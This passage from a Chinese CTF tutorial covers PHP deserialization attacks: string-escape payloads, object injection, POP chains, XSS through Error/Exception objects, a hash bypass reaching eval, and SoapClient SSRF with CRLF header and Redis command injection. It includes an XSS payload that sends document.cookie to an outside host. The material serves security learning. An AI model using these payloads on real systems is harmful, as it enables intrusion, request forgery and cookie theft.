$_GET['name']; $age = \"I am 11\"; $arr = array($name,$age); echo \"反序列化字符串：\"; var_dump(serialize($arr)); echo \"&lt;br/&gt;\"; echo \"过滤后:\"; $old = change(serialize($arr)); $new = unserialize($old); var_dump($new); echo \"&lt;br/&gt;此时，age=$new[1]\"; ?&gt; 正常输出如下 添加一个x看看： 这个就是将GET传入的name中的 x 改为了 xx，正常传入不含x的name值就会正常显示 例如：?name=mao，此时长度为3 如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4）进而影响下面的反序列化 我们可以利用这一点来实现字符串逃逸 构造： ?name=abcxxxxxxxxxxxxxxxxxxxx\";i:1;s:6:\"whoami\";} 输出如下： 解释： 当我们构造name时，在abc后写18个x，而且后面 \";i:1;s:4:“flag”;} 也是18的长度；在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度，从而造成 \";i:1;s:4:“flag”;} 溢出，前面的\"闭合前串，后面的;}闭合反序列化的全过程，而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程 总之，age变量被我们控制 2.过滤后字符变少(把反序列化后的两个x替换成为一个) &lt;?php function change($str){ return str_replace(\"xx\",\"x\",$str); } $arr['name'] = $_GET['name']; $arr['age'] = $_GET['age']; echo \"反序列化字符串：\"; var_dump(serialize($arr)); echo \"&lt;br/&gt;\"; echo \"过滤后:\"; $old = change(serialize($arr)); var_dump($old); echo \"&lt;br/&gt;\"; $new = unserialize($old); var_dump($new); echo \"&lt;br/&gt;此时，age=\"; echo $new['age']; 构造： ?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11\";s:3:\"age\";s:6:\"whoami\";} 这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“ 注意 \";s:3:“age”;s:28: 这一部分本来就有，后面的 ;s:3:“age”;s:6:“whoami”;} 为我们所构造的 age被我们控制 ctfshow web262 脚本： &lt;?php class message{ public $from; public $msg; public $to; public $token='user'; public function __construct($f,$m,$t){ $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; } } function filter($msg){ return str_replace('fuck', 'loveU', $msg); } $msg = new message('fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}','b','c'); $msg_1 = serialize($msg); echo $msg_1; $msg_2 =filter($msg_1); echo $msg_2; //O:7:\"message\":4:{s:4:\"from\";s:310:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:5:\"admin\";}\";s:3:\"msg\";s:1:\"b\";s:2:\"to\";s:1:\"c\";s:5:\"token\";s:4:\"user\";} ?&gt; 0x08 对象注入 对象注入 当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为PHP允 许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终 导致一个在该应用范围内的任意PHP对象注入。 前提需要满足两个条件 1、unserialize的参数可控。 2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函 数。 &lt;?php class A{ public $test = \"12345\"; function __destruct(){ echo $this-&gt;test; } } $a = 'O:1:\"A\":1:{s:4:\"test\";s:5:\"23456\";}'; unserialize($a); ?&gt; 脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出 23456 0x09 POP链简单介绍 前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来 简单案例MRCTF2020-Ezpop &lt;?php class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ //当尝试将对象调用为函数时触发 $this-&gt;append($this-&gt;var); } } $a $b class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; } public function __toString(){ //把类当作字符串使用时触发 return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) { echo \"hacker\"; $this-&gt;source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ //当调用一个不存在的或者是无法访问的属性的时候被调用 $function = $this-&gt;p; return $function(); } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']); } else{ $a=new Show; highlight_file(__FILE__); } ?&gt; 共有3个类，反序列化会调用__wakeup，存在于Show类__wake中的$this-&gt;source可控，也就是Show中$source变量可控 思路：将$source构造成一个对象Show，当$source为一个对象时。就会执行Show类中的__toString 此时将$str指向Test类 $this-&gt;str-&gt;source：取str类中的source值，使这个值自动调用__get 此时将$p构造成new Modifier return $function() 表示将function当作函数返回 当类变量直接当作函数调用的时候，就会调用魔术方法__invoke 然后将$var构造成读取源码即可 $var = 'php://filter/read=convert.base64-encode/recource=flag.php'; payload： &lt;?php ini_set('memory_limit','-1'); class Modifier { protected $var = 'php://filter/read=convert.base64- encode/resource=flag.php'; } class Show{ public $source; public $str; public function __construct($file){ $this-&gt;source = $file; $this-&gt;str = new Test(); } } class Test{ public $p; public function __construct(){ $this-&gt;p = new Modifier(); } } $a = new Show('aaa'); $a = new Show($a); echo urlencode(serialize($a)); ?&gt; 来自：https://www.bilibili.com/video/av4142669 0x10 PHP原生类反序列化利用 我们可以使用以下方法遍历一下PHP的内置类： &lt;?php $classes = get_declared_classes(); //返回由已定义类的名字所组成的数组 foreach ($classes as $class) { $methods = get_class_methods($class); //返回由类的方法名组成的数组 foreach ($methods as $method) { if (in_array($method, array( '__destruct', '__toString', '__wakeup', '__call', '__callStatic', '__get', '__set', '__isset', '__unset', '__invoke', '__set_state' // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类 ))) { print $class . '::' . $method . \" \"; } } } Exception::__wakeup Exception::__toString ErrorException::__wakeup ErrorException::__toString Error::__wakeup Error::__toString CompileError::__wakeup CompileError::__toString ParseError::__wakeup ParseError::__toString TypeError::__wakeup TypeError::__toString ArgumentCountError::__wakeup ArgumentCountError::__toString ArithmeticError::__wakeup ArithmeticError::__toString DivisionByZeroError::__wakeup DivisionByZeroError::__toString ClosedGeneratorException::__wakeup ClosedGeneratorException::__toString DateTime::__wakeup ...... 其中常遇到的几个 PHP 原生类有： Error Exception SoapClient DirectoryIterator SimpleXMLElement SplFileObject 10.1 Error/Exception 内置类进行 XSS Error 内置类 适用于php7版本 在开启报错的情况下 Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo &lt;Object&gt; 的写法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将Error以字符串的形式表达出来；那么假如有一个echo将它输出出来，而输出内容如果是我们可以控制的，那我们就可以用&lt;script&gt;标签来执行js代码了 example: &lt;?php $a = unserialize($_GET['whoami']); echo $a; ?&gt; （这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化） POC: &lt;?php $a = new Error(\"&lt;script&gt;alert('xss')&lt;/script&gt;\"); $b = serialize($a); echo urlencode($b); ?&gt; // 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D &lt;script&gt;标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯 Exception类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7的环境下都能使用 Exception 内置类 适用于php5、7版本 开启报错的情况下 example： &lt;?php $a = unserialize($_GET['whoami']); echo $a; ?&gt; &lt;?php $a = new Exception(\"&lt;script&gt;alert('xss')&lt;/script&gt;\"); $b = serialize($a); echo urlencode($b); ?&gt; // 输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D [BJDCTF 2nd]xss之光 不知道为何BUU里面这道题没了，只好看着别人的说一次。 进入题目，首先通过git泄露拿到源码： &lt;?php $a = $_GET['yds_is_so_beautiful']; echo unserialize($a); 仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。 由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下： &lt;?php $poc = new Exception(\"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;\"); echo urlencode(serialize($poc)); ?&gt; // 输出O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D 执行后，得到flag就在 cookie 中。 10.2 Error/Exception 内置类绕过哈希比较 Error 类 Error 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。 类摘要： Error implements Throwable { /* 属性 */ protected string $message ; protected int $code ; protected string $file ; protected int $line ; /* 方法 */ public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null ) final public getMessage ( ) : string final public getPrevious ( ) : Throwable final public getCode ( ) : mixed final public getFile ( ) : string final public getLine ( ) : int final public getTrace ( ) : array final public getTraceAsString ( ) : string public __toString ( ) : string final private __clone ( ) : void } 类属性： - message：错误消息内容 - code：错误代码 - file：抛出错误的文件名 - line：抛出错误在该文件中的行数 类方法： - `Error::__construct` — 初始化 error 对象 - `Error::getMessage` — 获取错误信息 - `Error::getPrevious` — 返回先前的 Throwable - `Error::getCode` — 获取错误代码 - `Error::getFile` — 获取错误发生时的文件 - `Error::getLine` — 获取错误发生时的行号 - `Error::getTrace` — 获取调用栈（stack trace） - `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace） - `Error::__toString` — error 的字符串表达 - `Error::__clone` — 克隆 error Exception 类 Exception 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。 类摘要： Exception { /* 属性 */ protected string $message ; protected int $code ; protected string $file ; protected int $line ; /* 方法 */ public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null ) final public getMessage ( ) : string final public getPrevious ( ) : Throwable final public getCode ( ) : mixed final public getFile ( ) : string final public getLine ( ) : int final public getTrace ( ) : array final public getTraceAsString ( ) : string public __toString ( ) : string final private __clone ( ) : void } 类属性： - message：异常消息内容 - code：异常代码 - file：抛出异常的文件名 - line：抛出异常在该文件中的行号 类方法： - `Exception::__construct` — 异常构造函数 - `Exception::getMessage` — 获取异常消息内容 - `Exception::getPrevious` — 返回异常链中的前一个异常 - `Exception::getCode` — 获取异常代码 - `Exception::getFile` — 创建异常时的程序文件名称 - `Exception::getLine` — 获取创建的异常所在文件中的行号 - `Exception::getTrace` — 获取异常追踪信息 - `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息 - `Exception::__toString` — 将异常对象转换为字符串 - `Exception::__clone` — 异常克隆 我们可以看到，在Error和Exception这两个PHP原生类中内都有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。 我们以Error为例，我们看看当触发他的 __toString 方法时会发生什么： &lt;?php $a = new Error(\"payload\",1); echo $a; 输出： Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} 发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 Error(\"payload\",1) 中的错误代码“1”则没有输出出来。 在来看看下一个例子： &lt;?php $a = new Error(\"payload\",1);$b = new Error(\"payload\",2); echo $a; echo \"\\r \\r \"; echo $b; 输出： Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} Error: payload in /var/www/html/tmp/test.php:2 Stack trace: #0 {main} 可见，$a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 __toString 返回的数据包含当前行号。 Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。 Error和Exception类的这一点在绕过在PHP类中的哈希比较时很有用。 [2020 极客大挑战]Greatphp &lt;?php error_reporting(0); class SYCLOVER { public $syc; public $lover; public function __wakeup(){ if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) ){ if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this-&gt;syc, $match)){ eval($this-&gt;syc); } else { die(\"Try Hard !!\"); } } } } if (isset($_GET['great'])){ unserialize($_GET['great']); } else { highlight_file(__FILE__); } ?&gt; ​ 我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可 ​ 由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可 poc：这里说一下url取反 URL编码取反绕过 适用PHP版本：无限制 当PHP&gt;=7时，可以直接利用取反构造payload PS C:\\Users\\Administrator&gt; php -r \"var_dump(urlencode(~'phpinfo'));\" Command line code:1: string(21) \"%8F%97%8F%96%91%99%90\" //实际上 (~%8F%97%8F%96%91%99%90)(); #phpinfo(); //利用链如下 &lt;?php $str = \"?&gt;&lt;?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?&gt;\"; //~urldecode=/flag $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-&gt;syc = $a; $c-&gt;lover = $b; echo(urlencode(serialize($c))); ?&gt; //这里解释以下，为什么要闭合掉\"?&gt;\"，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。 10.3 SoapClient 类进行 SSRF SoapClient 类 SOAP（简单对象访问协议）是连接Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。 如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项 类摘要： SoapClient { /* 方法 */ public __construct ( string|null $wsdl , array $options = [] ) public __call ( string $name , array $args ) : mixed public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null public __getCookies ( ) : array public __getFunctions ( ) : array|null public __getLastRequest ( ) : string|null public __getLastRequestHeaders ( ) : string|null public __getLastResponse ( ) : string|null public __getLastResponseHeaders ( ) : string|null public __getTypes ( ) : array|null public __setCookie ( string $name , string|null $value = null ) : void public __setLocation ( string $location = \"\" ) : string|null public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed } 可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。 该类的构造函数如下： public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 使用 SoapClient 类进行 SSRF 知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。 &lt;?php $a = new SoapClient(null,array('location'=&gt;'http://192.168.91.153:2333/aaa', 'uri'=&gt;'http://192.168.91.153:2333')); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?&gt; example： 首先在192.168.91.153:2333上起一个监听，然后再执行上述代码，就能够成功发送HTTP请求： root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7856 received! POST /aaa HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: PHP-SOAP/7.4.3 Content-Type: text/xml; charset=utf-8 SOAPAction: \"http://192.168.91.153:2333#a\" Content-Length: 387 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"http://192.168.91.153:2333\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 这里不知为何我开启不了这个类,先看个思路 但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。 如下测试代码，我们在HTTP头中插入一个cookie： &lt;?php $target = 'http://192.168.91.153:2333/'; $a = new SoapClient(null,array('location' =&gt; $target, 'user_agent' =&gt; \"WHOAMI\\r Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\", 'uri' =&gt; 'test')); $b = serialize($a); echo $b; $c = unserialize($b); $c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?&gt; 执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie： root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7858 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: WHOAMI Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4 # 插入的cookie Content-Type: text/xml; charset=utf-8 SOAPAction: \"test#a\" Content-Length: 365 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"test\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 利用HTTP协议去攻击Redis： &lt;?php $target = 'http://192.168.91.153:2333/'; $poc = \"CONFIG SET dir /var/www/html\"; $a = new SoapClient(null,array('location' =&gt; $target, 'uri' =&gt; 'hello^^'.$poc.'^^hello')); $b = serialize($a); $b = str_replace('^^',\" \\r\",$b); echo $b; $c = unserialize($b); $c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?&gt; 执行代码后，如下图所示，成功插入了Redis命令： root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7860 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: PHP-SOAP/7.4.3 Content-Type: text/xml; charset=utf-8 SOAPAction: \"hello CONFIG SET dir /var/www/html # 这里就是Redis命令 hello#a\" Content-Length: 403 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"hello CONFIG SET dir /var/www/html hello\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 这样我们就可以利用HTTP协议去攻击Redis了。 对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。 &lt;?php $target = 'http://192.168.91.153:2333/'; $post_data = 'data=whoami'; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93' ); $a = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=&gt;'test')); $b = serialize($a); $b = str_replace('^^',\" \\r\",$b); echo $b; $c = unserialize($b); $c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?&gt; 执行代码后，成功发送POST数据： root@ubuntu18:~# nc -lvp 2333 Listening on [0.0.0.0] (family 0, port 2333) Connection from 192.168.91.1 7862 received! POST / HTTP/1.1 Host: 192.168.91.153:2333 Connection: Keep-Alive User-Agent: wupco Content-Type: application/x-www-form-urlencoded X-Forwarded-For: 127.0.0.1 Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93 Content-Length: 11 data=whoami Content-Type: text/xml; charset=utf-8 SOAPAction: \"test#a\" Content-Length: 365 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"test\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; [LCTF 2018]bestphp’s revenge 题目给了源码(跟着复现一波) &lt;?php highlight_file(__FILE__); $b = 'implode'; call_user_func($_GET['f'], $_POST); session_start(); if (isset($_GET['name'])) { $_SESSION['name'] = $_GET['name']; } var_dump($_SESSION); $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); ?&gt; array(0) { } 扫一下目录：flag.php echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; } 这里说说明了需要本地地址访问才能输出flag。 1. 变量覆盖 首先我们看到第一个call_user_func()函数里面2个参数我们都可控，因此想到用extract()函数进行变量覆盖，先用var_dump()看一下session的内容： 这里能实现步骤为f赋值为extract，接着post传参b=var_dump，在第一个第一个call_user_func()函数中extract函数多了一个变量b，即extract(b)，由于extract函数的特性，函数内部实际上为extract（b=&gt;var_dump），于是形成$b=var_dump随后name赋值为job，在第二个call_user_func()函数中,构成了var_dump(array(reset($_SESSION), ‘welcome_to_the_lctf2018’))，输出参数中变量的相关信息 2. session反序列化 于是我们想通过`ini_set()`函数来构造`ini_set('session.serialize_handler', 'php_serialize');`来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是这个函数不接受数组,`$_POST`中需要设置参数传输； 所以用`session_start(['serialize_handler'=&gt;'php_serialize'])`，即POST传入`serialize_handler=php_serialize`来改变处理器，因为`session_start()`中如果提供参数，那么会用其中的项目覆盖会话配置指示中的配置项。即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET['f'], $_POST);` 函数，传入`GET：/?f=session_start`、`POST：serialize_handler=php_serialize`，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。 3. SoapClient类的利用 php中的SoapClient类可以创建soap数据报文，与wsdl接口进行交互。该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。 public SoapClient::SoapClient ( mixed $wsdl [, array $options ] ) 其中$options数组下有个user_agent选项，我们可以利用该选项来自定义User-Agent。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。 &lt;?php $target = \"http://127.0.0.1/flag.php\"; $attack = new SoapClient(null, array('location' =&gt; $target, 'user_agent' =&gt; \"btis\\r Cookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\\r \", 'uri' =&gt; \"123\")); $payload = urlencode(serialize($attack)); echo $payload; 其中有两个必备参数location是要将请求发送到的SOAP服务器的URL，uri 是SOAP服务的目标命名空间。我们将location设置为http://127.0.0.1/flag.php即本地flag.php文件，这个条件满足了flag.php中要求的$_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"，uri随便填就好。其中user_agent，是我们用来定义User-Agent，利用CRLF同时传入页面的cookie，使$_SESSION['flag'] = $flag;保存到指定cookie中。 O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D //注意传入的时候在O前面加了一个|符号，由于序列化与反序列化处理引擎不一样，反序列化时的引擎为PHP，会将|看做键值分隔符，将其后面的内容直接反序列化，也就是在你要解析session文件时，他会将你|后面的内容反序列化 利用php_serialize序列化传入后，并用php反序列化处理后此时session中包含了：一个键名a:1:{s:4:\"name\";s:222:\"，和一个SoapClient对象 array(1) { [\"a:1:{s:4:\"name\";s:222:\"\"]=&gt; object(SoapClient)#1 (5) { [\"uri\"]=&gt; string(3) \"123\" [\"location\"]=&gt; string(25) \"http://127.0.0.1/flag.php\" [\"_stream_context\"]=&gt; int(0) [\"_user_agent\"]=&gt; string(52) \"John Cookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1 \" [\"_soap_version\"]=&gt; int(1) } } 但此时还不会触发SSRF，需要触发 __call 